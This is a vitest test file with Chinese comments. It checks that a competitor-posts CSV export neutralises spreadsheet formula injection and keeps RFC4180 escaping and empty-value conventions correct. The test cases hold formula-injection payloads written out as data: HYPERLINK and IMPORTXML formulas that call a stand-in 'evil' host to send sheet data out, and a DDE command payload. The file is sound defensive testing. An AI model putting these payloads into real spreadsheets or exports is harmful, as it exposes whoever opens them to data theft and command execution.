import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { escapeCell, buildCsv } from '@/lib/csv';
import { topPostsCsv, topPostCsvRow, TOP_POSTS_CSV_HEADERS } from '@/app/(app)/competitors/top-posts-csv';

// CSV 导出（2026-08-30）。
//
// ── 为什么现在才有这份测试 ──
// 竞对高热榜单的导出原来是 CompetitorTopPosts() 里的一个闭包（那个函数 1121 行），
// **闭包里的代码测不了**。抽成纯函数才谈得上覆盖——而 CSV 拼装恰恰是
// 转义、空值、口径最容易出错的地方，这份文件还要发给别人。

const row = (over: Partial<Parameters<typeof topPostCsvRow>[0]> = {}) => ({
  platform: 'douyin', cleanTitle: '普通标题', competitor: { name: '某账号' },
  views: 1000, likes: 10, comments: 2, collects: 3, shares: 4,
  interaction: 19, rate: 0.019, publishedAt: new Date('2026-08-01T04:00:00Z'), ...over,
});

describe('公式注入：抓回来的标题不许在别人的 Excel 里执行', () => {
  // 这不是理论风险：标题与账号名**由竞对平台上的内容决定**，抓什么完全由对方写。
  // 用户导出榜单、双击打开，Excel/WPS 会把 = 开头的单元格当公式跑。
  it.each([
    ['=HYPERLINK("http://evil","查看详情")', '看起来像正经链接，点了就出去了'],
    ['=IMPORTXML("http://evil","//a")', '打开的瞬间把同表内容发出去'],
    ['+1+1', '加号一样是公式引导符'],
    ['@SUM(A1:A9)', 'at 号在部分表格软件里也是'],
    ['-2+3+cmd|\'/c calc\'!A0', 'DDE 那一类载荷是减号开头'],
  ])('%s 被中和', (payload) => {
    const csv = topPostsCsv([row({ cleanTitle: payload })]);
    // 加引号**防不住**这一层：引号是 CSV 语法，公式判定在解析掉引号之后
    expect(csv, '公式引导符没被中和').not.toMatch(new RegExp(`(^|,|")${payload.slice(0, 2).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`, 'm'));
    expect(escapeCell(payload).startsWith("'") || escapeCell(payload).startsWith('"\''), '该补的单引号没补').toBe(true);
  });

  it('账号名那一列也过同一道（两列都是抓来的）', () => {
    const csv = topPostsCsv([row({ competitor: { name: '=1+1' } })]);
    expect(csv).toContain("'=1+1");
  });

  it('正常标题一个字都不改（中和不能变成误伤）', () => {
    expect(escapeCell('今天聊聊 AI')).toBe('今天聊聊 AI');
    expect(escapeCell('2026 年终总结')).toBe('2026 年终总结');
    // 「—」是全角破折号，不是公式引导符，不该被动
    expect(escapeCell('—— 我的观察')).toBe('—— 我的观察');
  });

  it('制表符/回车开头也算（它们能把内容顶到下一格，绕过对首字符的检查）', () => {
    // 制表符在逗号 CSV 里不是分隔符，所以不加引号；补的就是那个中和用的单引号
    expect(escapeCell('\t=1+1')).toBe("'\t=1+1");
    expect(escapeCell('\r=1+1')).toBe('"\'\r=1+1"'); // 回车要加引号（它在 RFC4180 的转义集里）
  });
});

describe('RFC4180 转义没被这次改动弄坏', () => {
  it('逗号/引号/换行照旧处理', () => {
    expect(escapeCell('a,b')).toBe('"a,b"');
    expect(escapeCell('说"你好"')).toBe('"说""你好"""');
    expect(escapeCell('第一行\n第二行')).toBe('"第一行\n第二行"');
    expect(escapeCell('干净')).toBe('干净');
  });

  it('空值导成空格，不导 undefined/null 字样', () => {
    expect(escapeCell(null)).toBe('');
    expect(escapeCell(undefined)).toBe('');
    expect(escapeCell(0)).toBe('0'); // 数字 0 是真的 0，不能当空
  });

  it('带 BOM 与 CRLF（Excel 双击直接开不乱码）', () => {
    const csv = buildCsv(['a'], [['b']]);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(csv).toContain('\r\n');
  });
});

describe('高热榜单的取值口径', () => {
  it('列数与表头对齐（少一列会让整张表串位）', () => {
    expect(topPostCsvRow(row(), 0)).toHaveLength(TOP_POSTS_CSV_HEADERS.length);
  });

  it('🔒 播放量拿不到导空格，不导 0', () => {
    // 导成 0 的表格发给别人，对方无从分辨「这条真没人看」和「这个平台不给播放量」。
    // 这是本项目「缺席不许当成 0」那条口径在导出上的落点。
    expect(topPostCsvRow(row({ views: 0 }), 0)[4]).toBe('');
    expect(topPostCsvRow(row({ views: 5 }), 0)[4]).toBe(5);
  });

  it('🔒 互动率没有就是没有，不写 0.00%', () => {
    expect(topPostCsvRow(row({ rate: null }), 0)[10]).toBe('');
    expect(topPostCsvRow(row({ rate: 0.0193 }), 0)[10]).toBe('1.93%');
  });

  it('互动量为负（算不出）导空格', () => {
    expect(topPostCsvRow(row({ interaction: -1 }), 0)[9]).toBe('');
  });

  it('没有发布时间写「未记录」，不写空（空会被读成 0 点）', () => {
    expect(topPostCsvRow(row({ publishedAt: null }), 0)[11]).toBe('未记录');
  });

  it('排名从 1 开始', () => {
    expect(topPostCsvRow(row(), 0)[0]).toBe(1);
  });
});

describe('🔒 只有一套转义实现', () => {
  it('组件里不许再手搓转义（两套实现＝修一处漏一处）', () => {
    const src = readFileSync(join(process.cwd(), 'app/(app)/competitors/CompetitorTopPosts.tsx'), 'utf8');
    expect(src, '组件里又出现了手写的引号转义，请走 lib/csv.ts').not.toContain(`replace(/"/g, '""')`);
    expect(src).toContain('topPostsCsv(sortedPosts)');
  });

  it('服务端那两份导出也走同一个 escapeCell', () => {
    const src = readFileSync(join(process.cwd(), 'lib/insight/csv.ts'), 'utf8');
    expect(src).toContain("from '../csv'");
    expect(src, 'insight/csv.ts 里又自己定义了一套 esc').not.toMatch(/^function esc\(/m);
  });
});
